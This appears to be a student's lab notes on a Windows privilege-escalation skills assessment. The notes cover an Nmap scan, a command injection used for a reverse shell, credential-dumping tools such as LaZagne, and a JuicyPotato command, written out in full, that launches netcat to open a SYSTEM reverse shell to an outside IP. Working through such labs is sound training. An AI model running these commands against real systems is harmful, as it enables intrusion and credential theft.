
2026-05-28 10:16

Tags: #hands-on #escalation 

## Skills Assessment 1

- Nmap
	- ![[Pasted image 20260528101630.png]]
	- 80
	- 3389


- Web vulnerable to command injection => get a reverse shell
	- ![[Pasted image 20260528101700.png]]
	- ![[Pasted image 20260528101716.png]]


- KBs in the system (`systeminfo`)
	- ![[Pasted image 20260528101825.png]]

- This user privileges:
	- ![[Pasted image 20260528104309.png]]
	- SeImpersonate

- C:\users\Public is writable

- Use smbserver to transfer files

- Found nothing with lazagne, SharpChrome, SessionGopher

- Try JuicyPotato
	- Find CLSID
		- ![[Screenshot_20260528_163940.png]]
	- `.\JuicyPotato.exe -l 32131 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc64.exe 10.10.16.39 1024 -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"`
	- ![[Screenshot_20260528_164051.png]]
	- Get the shell
	- ![[Screenshot_20260528_164121.png]]

- Find the lag in the Desktop

- Find the confidential.txt file 
	- `get-childitem -recurse -filter "confidential.txt"`

- Run LaZagne again, get the credential in question 2
	- ![[Pasted image 20260528165309.png]]




## References:

